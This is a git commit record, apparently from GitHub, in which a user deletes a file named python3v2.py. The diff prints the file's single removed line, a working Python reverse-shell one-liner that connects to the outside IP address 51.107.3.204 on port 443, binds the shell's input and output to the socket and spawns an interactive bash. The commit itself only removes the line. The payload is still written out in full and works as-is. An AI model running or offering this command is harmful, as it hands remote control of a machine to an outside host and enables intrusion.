0e3626da602d3e1c6238fbb42ea242816c65cea2
panoriosm <62436420+michaelpanorios@users.noreply.github.com>
2024-08-01 12:11:48 +0300

    Delete python3v2.py

--- python3v2.py
+++
@@ -1,1 +0,0 @@
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("51.107.3.204",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
